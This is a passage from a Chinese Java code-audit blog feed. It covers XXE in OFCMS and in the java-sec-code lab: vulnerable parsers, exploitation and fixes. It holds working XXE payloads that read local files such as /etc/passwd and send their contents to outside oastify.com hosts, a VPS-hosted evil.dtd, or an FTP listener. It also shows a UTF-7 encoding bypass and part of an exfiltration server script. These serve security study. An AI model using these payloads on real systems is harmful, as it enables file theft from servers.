不支持dtd</span><br>xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>开始测试</p><p>利用前面发现的文件上传漏洞上传一个jrxml为后缀的文件</p><p>文件内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://3qu6uz9jay9cbyrfh9d0wtxmndt4h25r.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">abc</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:7777&quot;</span>&gt;</span>&amp;xxe; ]&gt;</span><br></code></pre></td></tr></table></figure><p>看到成功上传</p><p><img src="/img/ofcms/ofcms24.png"></p><p>访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/ofcms_admin_war/admin/reprot/expReport.html?j=../../static/1<br></code></pre></td></tr></table></figure><p><img src="/img/ofcms/ofcms25.png"></p><p>但是换了很多dns平台都没有访问记录，不知道为什么</p><h4 id="参数未过滤-误报"><a href="#参数未过滤-误报" class="headerlink" title="参数未过滤(误报)"></a>参数未过滤(误报)</h4><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;ContentController.java</p><p>第二条关于sql注入漏洞的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Record&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Record&gt;();<br>        Map&lt;String, Object&gt; params = getParamsMap();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//修改内容</span><br>            <span class="hljs-type">Record</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>();<br>            record.set(<span class="hljs-string">&quot;title_name&quot;</span>, params.get(<span class="hljs-string">&quot;title_name&quot;</span>));<br>            record.set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>));<br>            Db.update(<span class="hljs-string">&quot;of_cms_content&quot;</span>, <span class="hljs-string">&quot;content_id&quot;</span>,record);<br>            <span class="hljs-comment">//组装参数</span><br>            <span class="hljs-keyword">for</span> (String key : params.keySet()) &#123;<br>                list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>().set(<span class="hljs-string">&quot;name&quot;</span>,key).set(<span class="hljs-string">&quot;value&quot;</span>, params.get(key).toString()).set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>)));<br>            &#125;<br>            <span class="hljs-comment">//批量修改</span><br>            Db.batchUpdate(<span class="hljs-string">&quot;of_cms_content_field&quot;</span>,<span class="hljs-string">&quot;content_id,name&quot;</span>,list, list.size());<br><br>            rendSuccessJson();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>扫描呈现出此代码有漏洞的原因是工具中程序认定params中参数未过滤，但是实际通过此参数无法注入恶意数据完成字符串拼接</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>java代码审计工具初始配置下不如php完善，很多漏洞需要手动查找(准备多换几个工具试试)</li><li>要黑白盒结合审计，在网站寻找功能点再对应源码测试</li><li>手动搜索特殊函数与关键字对搜索结果做筛选找漏洞</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的XXE</title>
    <link href="/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/"/>
    <url>/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计中的XXE"><a href="#Java代码审计中的XXE" class="headerlink" title="Java代码审计中的XXE"></a>Java代码审计中的XXE</h2><p>感觉第一次学到xxe这个漏洞时学的不是很好，现在再来深入学习一下</p><p>参考：<a href="https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Java OWASP 中的 XXE 代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>​  <a href="https://blog.csdn.net/qq_48201589/article/details/136421867">【Java代码审计】XXE_java xxe-CSDN博客</a></p><p>​<a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>代码审计基于此项目：<a href="https://github.com/JoyChou93/java-sec-code?tab=readme-ov-file">JoyChou93&#x2F;java-sec-code</a></p><h3 id="XML文档的格式与结构"><a href="#XML文档的格式与结构" class="headerlink" title="XML文档的格式与结构"></a>XML文档的格式与结构</h3><p><a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>关于DTD：<a href="https://xz.aliyun.com/news/14107">JAVA XXE 从原理到利用-先知社区 (aliyun.com)</a></p><h3 id="判断XXE漏洞存在"><a href="#判断XXE漏洞存在" class="headerlink" title="判断XXE漏洞存在"></a>判断XXE漏洞存在</h3><ol><li>观察发送数据包中数据是否是xml格式</li><li>搜索处理XML文档相关的类与接口</li><li>开始测试，尝试是否能顺利访问DNS平台留下记录</li></ol><h3 id="审计中常见的类-接口"><a href="#审计中常见的类-接口" class="headerlink" title="审计中常见的类&#x2F;接口"></a>审计中常见的类&#x2F;接口</h3><p>xml文件的解析可用到的解析器有四种，对应不同的写法以及解析包</p><p>详细比较：<a href="https://blog.csdn.net/2501_90253336/article/details/145215020">Java进阶(五十一)XML 四种解析器(dom,sax,jdom,dom4j)原理及性能比较 java xml解析工具_java jdom-CSDN博客</a></p><h4 id="XMLReader-接口"><a href="#XMLReader-接口" class="headerlink" title="XMLReader(接口)"></a>XMLReader(接口)</h4><p>XMLReader接口是一种通过回调读取XML文档的接口，其存在于公共区域中。XMLReader接口是XML解析器实现SAX2驱动程序所必需的接口，其允许应用程序设置和查询解析器中的功能和属性、注册文档处理的事件处理程序，以及开始文档解析。当XMLReader使用默认的解析方法并且未对XML进行过滤时，会出现XXE漏洞</p><h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><p>SAXBuilder 是一个 JDOM 解析器，其能够将路径中的 XML 文件解析为 Document 对象。SAXBuilder 使用第三方 SAX 解析器来处理解析任务，并使用SAXHandler的实例侦听 SAX 事件。当SAXBuilder使用默认的解析方法并且未对XML进行过滤时，会出现 XXE 漏洞</p><h4 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h4><p>DOM4J是dom4j.org出品的一个开源XML解析包，使用起来非常简单，只要了解基本的XML-DOM模型，就能使用。DOM4J读&#x2F;写XML文档主要依赖于org.dom4j.io包，它有DOMReader和SAXReader两种方式。因为使用了同一个接口，所以这两种方式的调用方法是完全一致的。同样的，在使用默认解析方法并且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><p>SAXParserFactory使应用程序能够配置和获取基于SAX的解析器以解析XML文档。其受保护的构造方法，可以强制使用newInstance()。跟上面介绍的一样，在使用默认解析方法且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h4><p>Digester类用来将XML映射成Java类，以简化XML的处理。它是Apache Commons库中的一个jar包：common-digester包。一样的在默认配置下会出现XXE漏洞。其触发的XXE漏洞是没有回显的，我们一般需通过Blind XXE的方法来利用</p><h4 id="DocumentBuilderFactory"><a href="#DocumentBuilderFactory" class="headerlink" title="DocumentBuilderFactory"></a>DocumentBuilderFactory</h4><p>javax.xml.parsers包中的DocumentBuilderFactory用于创建DOM模式的解析器对象，DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance()方法，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。</p><p>由上述类与接口的功能与配置写法可知，如果使用默认的写法，一般都是会造成xxe漏洞的</p><p>需要使用安全写法或手动过滤</p><h3 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h3><p>最开始我们看到的 XMLReader 代码，以及其他的 xxxReader 代码，都是不回显的，因为它们只是对内容进行了解析，但是并没有对内容进行读取与输出。</p><ul><li>因为 XML 也是反序列化的一种，例如平常的 <code>Runtime.getRuntime.exe()</code> 是没有回显的，如果要有回显，必须要写 <code>byte[] code = ...</code> 这样子，把最后的结果读取出来。</li></ul><h4 id="DocumentBuilder-XXE"><a href="#DocumentBuilder-XXE" class="headerlink" title="DocumentBuilder XXE"></a>DocumentBuilder XXE</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>            <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>            <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br><br>            <span class="hljs-comment">// 遍历xml节点name和value</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">rootNodeList</span> <span class="hljs-operator">=</span> document.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">rootNode</span> <span class="hljs-operator">=</span> rootNodeList.item(i);<br>                <span class="hljs-type">NodeList</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> rootNode.getChildNodes();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; child.getLength(); j++) &#123;<br>                    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> child.item(j);<br>                    buf.append(String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, node.getNodeName(), node.getTextContent()));<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> buf.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            logger.error(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Drunkbaby</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里环境搭建出了一些问题，流程分析就不动态调试了，手动追踪一下代码执行流程</p><p>在此列出一些比较重要的代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br></code></pre></td></tr></table></figure><p>定义了一个名为 <code>DocumentBuilderVuln</code> 的方法，接收 <code>HttpServletRequest</code> 对象作为参数，返回一个字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br></code></pre></td></tr></table></figure><p>创建一个新的 XML 解析器工厂对象。</p><p><code>DocumnetBuilderFactory</code> 类用 <code>newInstance()</code> 的方式进行实例化。本身抽象类是不可以实例化的，但是 <code>DocumnetBuilderFactory</code> 自己定义了一个 <code>newInstance()</code> 实例化的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br></code></pre></td></tr></table></figure><p>从工厂中生成一个 XML 解析器（DocumentBuilder）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br></code></pre></td></tr></table></figure><p>将 HTTP 请求体作为输入流传入，用于解析 XML 数据，就是读入数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br></code></pre></td></tr></table></figure><p>解析 XML 数据，生成一个 DOM 树结构的 <code>Document</code> 对象。开始反序列化操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> buf.toString();<br></code></pre></td></tr></table></figure><p>最终可以看到调用了toString()方法，<mark>返回了拼好的字符串</mark>，所以这个方法是有回显的,能够用来读取一些文件内容</p><h3 id="无回显的XXE"><a href="#无回显的XXE" class="headerlink" title="无回显的XXE"></a>无回显的XXE</h3><p>返回包中是看不到字符串回显的</p><p>一般使用DNS检测来打无回显</p><h4 id="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的"><a href="#XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的" class="headerlink" title="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的"></a>XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的</h4><p>测试xxe漏洞是否存在只需要使用DNS检测即可</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zehfrya24b6tjn2oz8w00x6pegk784wt.oastify.com&quot;</span>&gt;</span> ]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>漏洞利用(利用dns外带数据)</p><p>将一个恶意的DTD放在自己的vps上</p><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br></code></pre></td></tr></table></figure><p>它将读取本地文件 <code>E:/1.txt</code>。</p><p>然后访问如下 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=&lt;文件内容&gt;<br></code></pre></td></tr></table></figure><p>文件内容就这样泄露到了攻击者控制的域名。</p><ul><li>原理上来说是这样的：</li></ul><p>有时候如果 xxe 当中如果服务端没有正确处理好使用 try catch，那么如果抛出异常 Web 界面通常会显示这个错误，所以我们可以如此攻击。</p><p>之前实操的时候是能看到网页回显是有报错的，但是dns平台有记录</p><p>发包攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> </span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;http://vps地址/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> %remote;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>攻击顺利是能看到返回的dns记录中url参数中有x&#x3D;…(文件内容)</p><p>这里环境调试出了一些问题，很遗憾没有看到成功的dns外带数据</p><h3 id="XXE漏洞的修复"><a href="#XXE漏洞的修复" class="headerlink" title="XXE漏洞的修复"></a>XXE漏洞的修复</h3><p>修复的手段主要就是一种：禁用外部实体 DTD。对于不同的解析器有不同的修复手段。</p><p>(外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，禁止外部实体，防止外部恶意文件加载)</p><p>关键语句就是这两句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">xif</span> <span class="hljs-operator">=</span> XMLInputFactory.newInstance();<br>        <span class="hljs-comment">// 不支持外部实体</span><br>       <span class="hljs-comment">// 后面两行是多加的代码 </span><br>        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 不支持dtd</span><br>        xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h3 id="绕过手法与trick"><a href="#绕过手法与trick" class="headerlink" title="绕过手法与trick"></a>绕过手法与trick</h3><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span><br>+ADwAIQ-DOCTYPE ANY +AFs-<br>  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-<br>+AF0APg-<br>+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-<br></code></pre></td></tr></table></figure><h4 id="Java-XML-DTD-的-trick-利用"><a href="#Java-XML-DTD-的-trick-利用" class="headerlink" title="Java XML DTD 的 trick 利用"></a>Java XML DTD 的 trick 利用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">evil</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///&quot;</span> &gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;netdoc://%evil;&#x27;&gt;&quot;</span>&gt;</span><br>%print;<br></code></pre></td></tr></table></figure><h4 id="解决文件跨行传输——-ftp-jdk1-7"><a href="#解决文件跨行传输——-ftp-jdk1-7" class="headerlink" title="解决文件跨行传输—— ftp&amp;jdk1.7+"></a>解决文件跨行传输—— ftp&amp;jdk1.7+</h4><p>看到这部分的时候觉得好厉害，居然还可以这样做</p><p>在 XXE 盲注中，通过 http 协议访问我们的服务器会只获取被读取的文件第一行。</p><p>在 jdk1.7 以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p><p>但是1.7之后，就修复了这个问题，会报错。</p><p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p><p>需要起一个<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">恶意的FTP服务器</a>，其他按照正常的XXE盲注打。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XMl"><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % c <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#x27;ftp://127.0.0.1:2121/%b;&#x27;&gt;&quot;</span>&gt;</span><br>%c;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">asd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8088/&quot;</span>&gt;</span> </span><br><span class="hljs-meta">   %asd; </span><br><span class="hljs-meta">   %rrr; </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启动ftp-server</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">require <span class="hljs-string">&#x27;socket&#x27;</span><br><br>ftp_server = TCPServer.new <span class="hljs-number">2121</span><br>http_server = TCPServer.new <span class="hljs-number">8088</span><br><br><span class="hljs-built_in">log</span> = File.open( <span class="hljs-string">&quot;xxe-ftp.log&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&lt;!ENTITY % b SYSTEM &quot;file:///tmp/1.txt&quot;&gt;</span><br><span class="hljs-string">           